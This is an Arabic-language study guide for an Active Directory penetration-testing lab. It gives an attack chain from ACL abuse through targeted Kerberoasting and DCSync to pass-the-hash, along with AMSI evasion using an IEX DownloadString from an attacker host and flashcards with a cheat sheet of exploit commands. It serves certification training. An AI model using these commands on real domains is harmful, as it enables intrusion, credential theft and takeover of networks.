- شنو يعني؟ بالويندوز، من تكتب باسوردك، النظام يحوله إلى صيغة رياضية (NTLM Hash) ويقارنه. هجوم الـ PTH يعني إنت ما تحتاج تعرف الباسورد الحقيقي المكتوب، بس تسرق الـ Hash وتمرره للنظام كأنه هو الباسورد.
    
- وين يظهر بالأدوات/الأوامر؟ نستخدمه بأدوات مثل `evil-winrm -H` أو `psexec.py -hashes`.
    

Nested Groups (الجروبات المتداخلة)

- شنو يعني؟ جروب يكون عضو داخل جروب ثاني. مثلاً جروب "متابعة" عضو بجروب "المدراء". الصلاحيات تنتقل بالوراثة (Inheritance). اللي يسيطر على الصغير، يسيطر على الكبير تلقائياً.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة السيناريوهات:

عدنا مجموعة تحديات متقدمة.

أولاً: أداة PowerView تنحظر أو بطيئة جداً.

ثانياً: عدنا صلاحية `GenericWrite` على جروب وما نعرف شنسوي بيها.

ثالثاً: عدنا صلاحية `GenericAll` على يوزر ونريد نستغله بدون ما نثير الانتباه.

رابعاً: وصلنا للـ Endgame وحصلنا صلاحيات الـ Replication، ونريد نسيطر على الدومين بالكامل.

🎯 معطيات السيناريو:

- اليوزرات المخترقة سابقاً: `wley` و `damundsen` و `forend`.
    
- الأهداف: `Help Desk Level 1` (جروب)، `dpayne` (يوزر)، والـ Domain Controller.
    
- القيود: برامج الحماية (AMSI) مفعلة، والبحث العشوائي `Identity *` ياخذ وقت طويل جداً وممكن ينحظر.
    

🧭 كيف تفكر؟ — Decision Trees حسب النوع:

━━━ لتخطي الحماية والسرعة (AMSI & Speed) ━━━

هل الأداة تنحظر أول ما تشغلها؟

├── نعم، يعطي خطأ script contains malicious content

│ ├── جرّب: AMSI Bypass (نحمل سكريبت يعطل الفحص بالذاكرة)

│ ├── جرّب: تحميل PowerView من الذاكرة مباشرة (IEX DownloadString)

│ └── جرّب: تحويل السكريبت إلى Base64 وتمريره كـ EncodedCommand

└── لا، تشتغل بس تأخذ وقت طويل جداً (Identity _) └── جرّب: Targeted Enumeration — ابحث عن يوزر أو جروب محدد بالاسم بدل النجمة (_).

━━━ لاستغلال صلاحية GenericWrite على جروب ━━━

شنو تكدر تسوي؟

├── هل إنت عضو بالجروب؟ لا.

├── هل تكدر تضيف نفسك؟ نعم، الـ GenericWrite تسمح بتعديل الأعضاء.

└── القرار: استخرج اليوزر اللي عندك عليه تحكم (damundsen)، غير باسورده، ادخل بيه، وضيف نفسك للجروب المطلوب.

━━━ لاستغلال صلاحية GenericAll على يوزر ━━━

تريد تخترق dpayne بصمت لو بإزعاج؟

├── هجوم مزعج (Noisy): غيّر باسورده فوراً بـ Set-DomainUserPassword. (اليوزر راح يفقد دخوله).

├── هجوم صامت ١ (Targeted Kerberoast): ازرع SPN وهمي، اطلب تذكرته، اكسر الهاش.

├── هجوم صامت ٢ (AS-REP Roast): عطّل الـ Pre-Auth بحسابه، اطلب تذكرته، اكسر الهاش.

└── هجوم صامت ٣ (Shadow Credentials): إذا اكو ADCS، ازرع شهادة وسجل دخول بيها.

━━━ لهجوم DCSync (The Endgame) ━━━

هل عندك صلاحيات DS-Replication-Get-Changes؟

├── نعم!

│ ├── استخدم `secretsdump.py` من الكالي (Parrot/Linux) لسحب الهاشات عبر الشبكة.

│ ├── اسحب هاش الـ Administrator و هاش الـ krbtgt.

│ └── نفذ Pass-the-Hash بـ `evil-winrm` للحصول على Shell كمدير.

└── لا.

└── استمر بالبحث بـ BloodHound عن مسار يوصلك لجروب عده هاي الصلاحيات (مثل Domain Admins أو Exchange Servers).

🗺️ خريطة الهجوم (Roadmap):

١. تخطي الـ AMSI واستخدام تقنية التعداد الموجه (Targeted Enum) لمعرفة صلاحيات `forend`.

٢. استغلال صلاحيات `GenericWrite` لإضافة يوزرات لجروبات حساسة.

٣. استغلال صلاحية `GenericAll` لتنفيذ Targeted Kerberoasting بهدوء.

٤. الوصول ليوزر `adunn` واستخدام صلاحيات المزامنة لتنفيذ DCSync.

٥. تسجيل الدخول كـ Administrator وإعلان السيطرة.

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا نطبق الخطة خطوة بخطوة. ركز على التفاصيل لأن كل أمر إله سبب.

الخطوة [1]: تخطي الحماية (AMSI Bypass) والاستيراد الآمن

📌 ليش نسوي هاي الخطوة؟

برنامج Windows Defender يقرأ محتوى ملف `PowerView.ps1` وراح يرفض تشغيله لأن الأداة معروفة كأداة اختراق (Signature-based detection). الحل الأسهل هو تشفير الكود وتمريره للذاكرة مباشرة، أو استخدام أوامر مخفية، بس هنا راح نستعرض طريقة جلب الكود من سيرفرنا (الكالي/Parrot) مباشرة للذاكرة.

🔧 الأمر:

PowerShell

```
# على جهاز المهاجم (Linux) نفتح سيرفر بسيط بمجلد الأدوات
python3 -m http.server 80

# على السيرفر الهدف (Windows) نطلب السكريبت ونشغله بالذاكرة باستخدام IEX
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `python3 -m http.server`: يفتح ويب سيرفر سريع.
    
- `IEX` (Invoke-Expression): ياخذ النص اللي يستلمه من الرابط وينفذه مباشرة ككود PowerShell بالذاكرة (In-Memory) بدون ما ينحفظ كملف على الهارد ديسك، مما يقلل فرصة كشفه من الـ Antivirus.
    
- `DownloadString`: تجلب النص البرمجي من رابط خارجي.
    

📤 الـ Output المتوقع:

PowerShell

```
# لا يوجد output مرئي، لكن الأداة الآن محملة بالذاكرة وجاهزة للاستخدام.
PS C:\>
```

━━━━━━━━━━━━━━

الخطوة [2]: التعداد الموجه (Targeted Enumeration) للسرعة (Q4 & Q5)

📌 ليش نسوي هاي الخطوة؟

أمر `Identity *` ياخذ أكثر من ٥ دقائق بالشبكات الكبيرة وممكن يسوي Timeout. بما إنه إحنا مهتمين نعرف صلاحيات `forend` على أهداف محددة (مثل اليوزر `dpayne` والجروب `GPO Management`)، راح نسأل النظام عنهم بالاسم مباشرة.

🔧 الأمر:

PowerShell

```
# أولاً: نحول اسم المهاجم forend إلى SID حتى نبحث عنه بالنتائج
$sid3 = Convert-NameToSid forend

# ثانياً: نفحص اليوزر dpayne حصراً (لإجابة Q4)
Get-DomainObjectACL -ResolveGUIDs -Identity "dpayne" | Where-Object {$_.SecurityIdentifier -eq $sid3}

# ثالثاً: نفحص الجروب GPO Management حصراً (لإجابة Q5)
Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | Where-Object {$_.SecurityIdentifier -eq $sid3}
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `-Identity "dpayne"`: يخلي الأداة تجلب الـ ACL الخاصة بـ dpayne فقط! هذا يخلي الأمر يتنفذ بأجزاء من الثانية.
    
- `-ResolveGUIDs`: ذكرناها، حتى نترجم الأرقام لكلمات مفهومة.
    

📤 الـ Output المتوقع (لليوزر dpayne):

PowerShell

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dagmar Payne,OU=IT,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : GenericAll
ObjectAceType          : All
SecurityIdentifier     : S-1-5-21-XXX-XXX-XXX-1002
```

✅ النتيجة: عرفنا إن `forend` عنده `GenericAll` على `dpayne`.

━━━━━━━━━━━━━━

الخطوة [3]: استغلال GenericWrite على جروب (إضافة عضو)

📌 ليش نسوي هاي الخطوة؟

بالتحليل السابق، اكتشفنا إن اليوزر `damundsen` عنده `GenericWrite` على جروب `Help Desk Level 1`. هذي الصلاحية تسمح لنا نعدل خصائص الجروب، وأهم خاصية هي "قائمة الأعضاء". راح نضيف اليوزر المخترق للجروب حتى نورث (Inherit) كل صلاحيات الجروب.

🔧 الأمر:

PowerShell

```
# أولاً: نغير باسورد damundsen لأننا نملك ForceChangePassword عليه (من حساب wley)
$newpass = ConvertTo-SecureString 'HackedPass@2026!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $newpass

# ثانياً: نجهز كائن بيانات الدخول (Credential Object) لليوزر damundsen
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $newpass)

# ثالثاً: نستخدم صلاحية GenericWrite لإضافة أنفسنا (damundsen) للجروب
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $cred

# رابعاً: نتحقق من نجاح الإضافة
Get-DomainGroupMember -Identity 'Help Desk Level 1'
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Set-DomainUserPassword`: أداة لتغيير الباسورد مباشرة بدون معرفة القديم (لأن عدنا صلاحية).
    
- `PSCredential`: الويندوز يطلب منك إثبات هوية قبل ما تنفذ أمر بصلاحيات يوزر ثاني. هذا الأمر يدمج الاسم والباسورد بمتغير واحد.
    
- `Add-DomainGroupMember`: أداة لتعديل أعضاء الجروب، واستخدمنا `-Credential` حتى ننفذها باسم `damundsen` (صاحب الصلاحية).
    

📤 الـ Output المتوقع:

PowerShell

```
# بعد أمر التحقق Get-DomainGroupMember، راح يظهر damundsen ضمن الأعضاء
GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Help Desk Level 1
MemberName              : damundsen
MemberSID               : S-1-5-21-XXX-1105
```

━━━━━━━━━━━━━━

الخطوة [4]: استغلال GenericAll بصمت (Targeted Kerberoasting)

📌 ليش نسوي هاي الخطوة؟

عدنا `GenericAll` على اليوزر `dpayne`. ما نريد نغير باسورده ونفضحه. راح نستخدم حيلة ذكية: نزرع إله خاصية `SPN` (واللي عادة تنعطي للسيرفرات فقط). هذا راح يخلي النظام يعتبر `dpayne` كأنه "خدمة"، وبالتالي نكدر نطلب تذكرته المشفرة (TGS) ونكسرها بـ Hashcat لمعرفة باسورده الأصلي.

🔧 الأمر:

PowerShell

```
# زرع SPN وهمي لليوزر dpayne
Set-DomainObject -Identity dpayne -SET @{serviceprincipalname='fake/NOTHING'}

# من جهاز الكالي (Linux)، نطلب التذكرة باستخدام أداة GetUserSPNs.py من Impacket
python3 GetUserSPNs.py INLANEFREIGHT.LOCAL/forend:Password123 -dc-ip 10.10.10.10 -request -outputfile dpayne_hash.txt

# تنظيف الـ SPN الوهمي (حتى ما ننكشف)
Set-DomainObject -Identity dpayne -Clear serviceprincipalname
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `-SET @{serviceprincipalname='fake/NOTHING'}`: يعدل الـ Attribute الخاص بالـ SPN ويحطله أي اسم وهمي (مثل fake/NOTHING).
    
- `GetUserSPNs.py`: سكريبت بايثون يبحث عن أي يوزر بالدومين عنده SPN ويسحب التذكرة مالته (Ticket Granting Service - TGS) ويحفظها بملف.
    
- `-Clear`: خطوة احترافية جداً لمسح الأثر (OpSec).
    

📤 الـ Output المتوقع (للأداة باللينكس):

Plaintext

```
ServicePrincipalName  Name    MemberOf                                            PasswordLastSet             LastLogon  Delegation 
--------------------  ------  --------------------------------------------------  --------------------------  ---------  ----------
fake/NOTHING          dpayne  CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2026-07-31 09:15:32         <never>    False

[+] Saving tickets in dpayne_hash.txt
```

✅ الخطوة التالية: تاخذ ملف `dpayne_hash.txt` وتكسره بـ Hashcat (Mode 13100).

━━━━━━━━━━━━━━

الخطوة [5]: النهاية الحتمية (The Endgame) — DCSync Attack

📌 ليش نسوي هاي الخطوة؟

لنفترض أن مسار الصلاحيات (Attack Chain) وصلك لليوزر `adunn`. بالبحث العشوائي، اكتشفت أن `adunn` يمتلك صلاحيتين نادرة جداً ومخصصة للسيرفرات فقط:

`DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-In-Filtered-Set`.

هذه الصلاحيات تسمحلك تنفذ أخطر هجوم بالـ Active Directory: الـ DCSync. راح نطلب الهاش الخاص بالمدير (Administrator).

🔧 الأمر:

Bash

```
# ننفذ الهجوم من جهازنا اللينكس (Parrot/Kali) باستخدام secretsdump.py
python3 secretsdump.py -just-dc-user Administrator INLANEFREIGHT.LOCAL/adunn:AdunnPass123!@10.10.10.200

# أو سحب كل الهاشات لكل اليوزرات بالشركة!
python3 secretsdump.py -outputfile all_hashes -just-dc INLANEFREIGHT.LOCAL/adunn:AdunnPass123!@10.10.10.200
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `secretsdump.py`: أداة مرعبة من Impacket، تتصل بالـ Domain Controller عن طريق بروتوكول MS-DRSR (الخاص بالتزامن) وتخدعه.
    
- `-just-dc-user Administrator`: يحدد إننا نريد فقط هاش يوزر محدد (حتى ما نسحب آلاف الهاشات ونسوي ضغط على الشبكة).
    
- `INLANEFREIGHT.LOCAL/adunn...`: بيانات دخول اليوزر اللي يملك صلاحية الـ Replication.
    

📤 الـ Output المتوقع:

Plaintext

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1573966a64cc31cc:::
```

✅ الخطوة التالية: حصلنا الـ NTLM Hash للمدير `7796ee39fd3a9c3a1573966a64cc31cc`. ما نحتاج نكسره! نستخدم تقنية Pass-the-Hash للاتصال كمدير:

Bash

```
evil-winrm -i 10.10.10.200 -u Administrator -H 7796ee39fd3a9c3a1573966a64cc31cc
```

مبروك! أنت الآن `NT AUTHORITY\SYSTEM` أو `Domain Admin`. اللعبة انتهت بالكامل.

📊 لحد هسة:

[x] تخطينا الـ AMSI وحملنا أدواتنا.

[x] استخدمنا الـ Targeted Enum للسرعة والتخفي.

[x] استغلينا GenericWrite لإضافة يوزرات لجروبات.

[x] استغلينا GenericAll لزرع SPN وسحب هاشات بصمت.

[x] وصلنا لـ Replication Rights ونفذنا DCSync!

رسمة الـ Attack Chain الكاملة (من البداية للنهاية):

Plaintext

```
[Attacker Setup]
    │
    ├─ 1. wley (Compromised initially)
    │       │ [ForceChangePassword - GUID: 00299570...]
    │       ▼
    ├─ 2. damundsen
    │       │ [GenericWrite]
    │       ▼
    ├─ 3. Help Desk Level 1 (Group)
    │       │ [Nested inside]
    │       ▼
    ├─ 4. Information Technology (Group)
    │       │ [GenericAll]
    │       ▼
    ├─ 5. adunn (User)
    │       │ [DS-Replication-Get-Changes]
    │       ▼
    └─ 6. DCSync Attack via secretsdump.py
            │
            ▼
        [DOMAIN CONTROLLER PWNED - ALL HASHES DUMPED]
```

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

🔄 Variations محتملة:

Variation 1: ماذا لو `IEX DownloadString` انحظر أيضاً بـ AMSI؟

- أحياناً الحماية تكون قوية جداً. الحل هو تحويل سكريبت `PowerView` بالكامل إلى نص مشفر بـ Base64، وبعدين تشغيله.
    

PowerShell

```
# تجهيز الكود المشفر (من جهازك)
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\PowerView.ps1")
$encoded = [Convert]::ToBase64String($bytes)

# تنفيذه على الهدف
powershell.exe -EncodedCommand $encoded
```

Variation 2: ماذا لو لم تجد أي صلاحيات على اليوزر نفسه؟ (Group Memberships)

- الصلاحيات ما تنربط باليوزر بس، بل تنربط بالجروبات اللي ينتمي إلها. إذا فحصت `wley` وما لكيت شي، ابحث عن الجروبات اللي هو بيها!
    

PowerShell

```
# اعرف جروبات اليوزر
Get-ADUser -Identity wley -Properties MemberOf | Select-Object -ExpandProperty MemberOf
# بعدين افحص الصلاحيات اللي يمتلكها الجروب
$groupSID = Convert-NameToSid "IT_Support_Group"
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $groupSID}
```

Variation 3: ماذا لو استخدمت `-ResolveGUIDs` وبقى يطلعلك رقم GUID خام مثل `ab721a53-1e2f-11d0-9819-00aa0040529b`؟

- هذا يعني أن PowerView ما كدر يترجمه. الـ GUIDs بالـ AD مخزنة بمكانين: `Extended-Rights` (لصلاحيات الوصول) و `Schema` (لخصائص الـ Attributes). لازم تبحث بالـ Schema يدوياً:
    

PowerShell

```
Get-ADObject -SearchBase "CN=Schema,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'attributeSchema'} -Properties * | Where-Object {$_.schemaIDGUID -eq [guid]'ab721a53-1e2f-11d0-9819-00aa0040529b'} | Select-Object Name
```

Variation 4: ماذا لو أردت بديل عن أداة PowerView بالكامل بدون تنزيل أي شيء؟ (Built-in Fallback)

- تكدر تستخدم الأوامر الأصلية للويندوز `Get-Acl` مع حلقة تكرار (Loop). هاي الطريقة بطيئة جداً، بس مستحيل ينكشف كفايروس لأنها أوامر نظام شرعية.
    

PowerShell

```
# تسحب كل اليوزرات لملف txt، بعدين تسوي Loop يفحص الـ ACL لكل يوزر
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'forend'}
}
```

Variation 5: ماذا لو كنت تريد تخترق `dpayne` بصمت، بس ما عندك صلاحية تضيف SPN (Kerberoasting فشل)؟

- إذا عندك `GenericAll`، تكدر تستخدم هجوم AS-REP Roasting كبديل! مجرد إنك تعدل خاصية `useraccountcontrol` لليوزر وتضيف إلها قيمة `4194304` (واللي تعني `DONT_REQ_PREAUTH`).
    

PowerShell

```
Set-DomainObject -Identity dpayne -XOR @{useraccountcontrol=4194304}
# بعدها تسحب التذكرة بـ GetNPUsers.py من الكالي.
```

Variation 6: ماذا لو البيئة كبيرة جداً والبحث النصي معقد؟ (The Professional Shortcut)

- الملاذ الأخير والمفضل للمحترفين هو `BloodHound`. شغل أداة `SharpHound.exe` لجمع الداتا، اسحب ملف الـ ZIP لجهازك، وارميه بواجهة BloodHound (عن طريق `sudo neo4j start` ثم `bloodhound &`). الواجهة الرسومية راح توفرلك استعلامات جاهزة مثل "Find Principals with DCSync Rights" وترسملك الخريطة كاملة بأسهم واضحة، وتغنيك عن قراءة الجداول المزعجة بالـ PowerShell.
    

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ المتقدمة):

🚨 فخ الـ GenericWrite على المستخدمين vs الجروبات:

- إذا عندك `GenericWrite` على جروب = تكدر تضيف نفسك كعضو (Add-DomainGroupMember).
    
- إذا عندك `GenericWrite` على يوزر = ما تكدر تغير باسورده! بس تكدر تعدل خصائصه (مثل زرع SPN أو تعديل مسار الـ Logon Script). لا تخلط بينهم!
    

🚨 فخ הـ DCSync بكلمات المرور المتغيرة:

- مرات تسحب هاش الـ Administrator عبر DCSync، بس تجي تسوي Pass-the-Hash وما يشتغل. السبب؟ المطورين أحياناً يخلون حساب الـ Administrator معطل (Disabled) ويستخدمون حسابات مخصصة بأسماء ثانية للـ Domain Admins. الحل: اسحب هاش يوزر فعّال أنت شفته بالـ BloodHound موجود بجروب Domain Admins، أو اسحب هاش `krbtgt` واصنع Golden Ticket.
    

🚨 فخ الـ AMSI Bypass المؤقت:

- أوامر الـ AMSI Bypass تشتغل فقط على الـ Session (النافذة) المفتوحة حالياً. إذا قفلت الـ PowerShell وفتحته مرة ثانية، الـ Defender راح يرجع يشتغل ولازم تعيد الـ Bypass.
    

🔑 Golden Tips:

"لا تعتمد أبداً على أداة وحدة. الـ PowerView ممكن ينحظر، الـ BloodHound ممكن ينكشف بالشبكة كحركة غير طبيعية (Noisy). دائماً خلي بجيبك أدوات الويندوز الأصلية `Get-ADObject` و `Get-Acl`. وإذا حصلت GenericAll، فكر بالهدوء قبل الإزعاج: Kerberoasting الموجه والـ ASREPRoasting راح يوفرلك الهاش بدون ما تخلي اليوزر يشك بأي شي."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو هجوم DCSync وما هي الصلاحيات المطلوبة لتنفيذه؟

✅ Back: هجوم لسرقة هاشات الباسوردات بانتحال شخصية Domain Controller. يحتاج صلاحيات: DS-Replication-Get-Changes و DS-Replication-Get-Changes-In-Filtered-Set.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف تقوم بتخطي بطء البحث بأداة PowerView في بيئات العمل الضخمة؟

✅ Back: باستخدام Targeted Enumeration. بدلاً من -Identity *، نحدد اسم الكائن المطلوب: Get-DomainObjectACL -Identity "Username"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف تستغل صلاحية GenericAll على مستخدم (User) بأكثر طريقة صامتة (Stealthy)؟

✅ Back: عبر Targeted Kerberoasting. نزرع SPN وهمي لليوزر باستخدام Set-DomainObject، ثم نطلب التذكرة عبر GetUserSPNs.py ونكسرها.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تفعل إذا حظر Windows Defender أو AMSI تشغيل ملف PowerView.ps1؟

✅ Back: نستدعيه مباشرة للذاكرة (In-Memory) لتجنب حفظه على القرص، باستخدام IEX و DownloadString.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: حصلت على صلاحية GenericWrite على جروب معين. ما هي الخطوة الاستغلالية المباشرة؟

✅ Back: إضافة المستخدم الذي اخترقته إلى هذا الجروب للحصول على صلاحيات الجروب، باستخدام Add-DomainGroupMember.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي الأداة الأفضل لاستخراج وتصور مسارات الـ ACL المعقدة والمتداخلة كرسومات بيانية؟

✅ Back: BloodHound. نستخدم SharpHound.exe لجمع البيانات (Ingestion)، ثم نستورد الـ ZIP إلى واجهة BloodHound للتحليل المرئي.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تفعل بعد الحصول على NTLM Hash لمدير الشبكة عبر هجوم DCSync؟

✅ Back: لا حاجة لكسره. استخدم تقنية Pass-the-Hash عبر أدوات مثل evil-winrm أو psexec.py لتسجيل الدخول مباشرة كمدير.

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (Advanced AD Exploitation Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية استغلال الصلاحيات (Post-Enumeration):

١. هل عندك `GenericAll` على مستخدم؟ -> ازرع SPN أو غيّر الباسورد.

٢. هل عندك `GenericWrite` على جروب؟ -> أضف نفسك للجروب.

٣. هل ورثت صلاحيات `DS-Replication...`؟ -> نفذ هجوم DCSync.

٤. استخدم التعداد الموجه (-Identity "Name") دائماً لتسريع العمل وتجنب كشفك.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر المتقدمة (Exploitation & Bypasses):

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|Defense Evasion|AMSI Bypass in Memory|`IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1')`|
|Targeted Enum|استعلام سريع عن يوزر|`Get-DomainObjectACL -ResolveGUIDs -Identity "TargetUser"`|
|Abuse|تغيير باسورد بيوزر مفروض|`Set-DomainUserPassword -Identity UserTarget -AccountPassword (ConvertTo-SecureString 'New@123' -AsPlainText -Force)`|
|Abuse|استخدام Credentials بمتغير|`$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $pass)`|
|Abuse|إضافة عضو لجروب|`Add-DomainGroupMember -Identity 'Target Group' -Members 'YourUser' -Credential $cred`|
|Abuse|زرع SPN لغرض Kerberoasting|`Set-DomainObject -Identity TargetUser -SET @{serviceprincipalname='fake/SPN'}`|
|Abuse|إزالة SPN الوهمي للتنظيف|`Set-DomainObject -Identity TargetUser -Clear serviceprincipalname`|
|EndGame|سحب التذاكر (Kerberoasting)|`python3 GetUserSPNs.py DOMAIN/User:Pass -dc-ip DC_IP -request -outputfile hashes.txt`|
|EndGame|سحب كل الهاشات (DCSync)|`python3 secretsdump.py -just-dc DOMAIN/Admin:Pass@DC_IP`|
|EndGame|سحب هاش يوزر محدد (DCSync)|`python3 secretsdump.py -just-dc-user Administrator DOMAIN/Admin:Pass@DC_IP`|
|EndGame|تمرير الهاش (Pass-the-Hash)|`evil-winrm -i DC_IP -u Administrator -H <NTLM_HASH>`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 تحليل صلاحيات الاستغلال السريع:

|**نوع الصلاحية المكتشفة**|**الاستغلال الأفضل والأكثر هدوءاً**|
|---|---|
|`GenericWrite` على جروب|أضف نفسك كعضو لوراثة الصلاحيات.|
|`GenericAll` على مستخدم|Targeted Kerberoasting (زرع SPN).|
|`GenericWrite` على مستخدم|تعديل الـ Logon Script أو زرع SPN.|
|`ForceChangePassword`|تغيير الباسورد وتسجيل الدخول كالمستخدم.|
|`Self-Membership`|إلحاق نفسك مباشرة بالجروب المستهدف.|
|`Replication Rights`|DCSync الفوري لسحب `krbtgt` و `Administrator`.|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ المتقدمة (لا تنساها):

❌ إضافة SPN وهمي ونسيان مسحه بعد سحب التذكرة (يعرضك للكشف من فريق الحماية).

❌ تغيير باسورد مستخدم يمتلك GenericAll بشكل عشوائي، مما يمنعه من العمل ويثير إنذاراً مبكراً.

❌ تنفيذ `Identity *` ببيئة إنتاجية ضخمة (يسحب كل ذاكرة السيرفر وممكن يوقفه).

❌ التوقف عند العثور على `GenericWrite` لجروب دون فهم أنك بحاجة لإضافة نفسك لتستفيد من صلاحياته الوراثية.

❌ نسيان سحب هاش `krbtgt` في هجوم DCSync، فهو المفتاح الذهبي لصناعة تذاكر مستدامة حتى لو تم تغيير كلمات المرور.

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (كيف نتحول من تعداد إلى سيطرة كاملة بهدوء)

✅ كل المصطلحات (AMSI, DCSync, Shadow Credentials, ASREPRoasting...)

✅ كيفية التفكير (decision trees لتحديد مسار الهجوم حسب نوع الصلاحية)

✅ الاستغلال التفصيلي (خطوة خطوة نحو ضربة الـ DCSync القاضية)

✅ الـ bypasses والـ variations والفخوخ (AMSI Bypass, Nested Groups)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪


]

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED           ║
║  [✓] AUTHORED BY: Hexsein · T4E Channel · CPTS Candidate             ║
║  [→] NEXT TARGET: SEC-[NUM+1] — [REPLACE: NEXT SECTION NAME]         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```